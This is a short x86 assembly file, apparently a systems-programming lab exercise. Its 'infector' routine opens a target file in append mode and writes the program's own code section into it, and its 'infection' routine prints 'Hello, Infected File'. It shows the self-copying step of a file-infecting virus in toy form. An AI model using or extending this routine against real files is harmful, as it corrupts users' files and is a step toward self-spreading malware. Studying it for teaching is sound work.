section .text

section .data
even_msg db 'Hello, Infected File'
len1 equ $ - even_msg

global _start
global system_call
global infection
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

   



system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    infection:
        push    ebp             ; Save caller state
        mov     ebp, esp
        pushad                  ; Save some more caller state

        mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
        test    eax, 1
        jnz      rest1
    even:
        mov eax, 4
        mov ebx, 1
        mov ecx, even_msg
        mov edx, len1
        int     0x80            ; Transfer control to operating system
    rest1:
        popad                   ; Restore caller state (registers)
        pop     ebp             ; Restore caller state
        ret 
    infector:
        initialize:
        push    ebp             ; Save caller state
        mov     ebp, esp
        pushad                  ; Save some more caller state

        mov eax, 5                  ; SYS_OPEN
        mov ebx, [ebp+8]        ; file name
        mov ecx, 1024 | 1           ; O_APPEND
        mov edx, 0777
        int     0x80            ; Transfer control to operating system
        mov esi, eax                   ; store return value in esi

        mov eax, 4                  ; SYS_WRITE
        mov ebx, esi      ; file name
        mov ecx, code_start              ; string (to write) from adress
        mov edx, code_end                  ; string (to write) to adress
        sub edx, ecx                    ; length of string
        int     0x80            ; Transfer control to operating system

        mov eax, 6                  ; SYS_CLOSE
        mov ebx, esi      ; file name
        int     0x80            ; Transfer control to operating system
        restore:
        popad                   ; Restore caller state (registers)
        pop     ebp             ; Restore caller state
        ret 

code_end: